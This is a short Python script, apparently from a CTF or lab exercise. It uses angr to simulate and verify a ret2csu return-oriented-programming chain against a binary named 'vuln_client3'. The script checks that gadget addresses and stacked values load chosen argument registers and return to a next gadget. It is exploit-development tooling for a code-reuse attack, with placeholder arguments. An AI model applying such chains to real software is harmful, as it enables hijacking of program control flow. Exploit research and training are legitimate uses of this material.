import logging, angr, angrop
from angr import claripy
logging.getLogger("angrop").setLevel(logging.ERROR); logging.getLogger("angr").setLevel(logging.CRITICAL)
B="bins/vuln_client3"
POP=0x40152a; DISPATCH=0x401510; RET=0x401534; NEXTPC=0x401544
FD,BUF,LEN = 0x41414141, 0x4242424242424242, 0x4343434343434343
TAB=0x404800; STACK=0x7ffff000; fill=0x6161616161616161
p=angr.Project(B, auto_load_libs=False)
end=p.arch.memory_endness

vals=[0,1,FD,BUF,LEN,TAB, DISPATCH] + [fill]*7 + [NEXTPC]
st=p.factory.blank_state(addr=POP, add_options={angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                                                angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS})
st.regs.rsp = claripy.BVV(STACK,64)
for i,v in enumerate(vals):
    st.memory.store(STACK+8*i, claripy.BVV(v,64), endness=end)
st.memory.store(TAB, claripy.BVV(RET,64), endness=end)   # table[0] -> ret (call returns immediately)

simgr=p.factory.simulation_manager(st)
reached=False; seen=[]
for _ in range(300):
    if not simgr.active: break
    cur=simgr.active[0]; pc=cur.addr; seen.append(pc)
    if pc==NEXTPC:
        rdx=cur.solver.eval(cur.regs.rdx); rsi=cur.solver.eval(cur.regs.rsi); edi=cur.solver.eval(cur.regs.edi)
        print("REACHED next_pc=%#x"%pc)
        print("  rdx=%#x (==LEN? %s)"%(rdx, rdx==LEN))
        print("  rsi=%#x (==BUF? %s)"%(rsi, rsi==BUF))
        print("  edi=%#x (==FD?  %s)"%(edi, edi==(FD&0xffffffff)))
        reached=True; break
    simgr.step(num_inst=1)
print("RESULT:", "RETURN-OK (ret2csu returned & continued to next_pc with args set)" if reached else "did NOT reach next_pc")
if not reached: print("  trace tail:", [hex(a) for a in seen[-15:]])
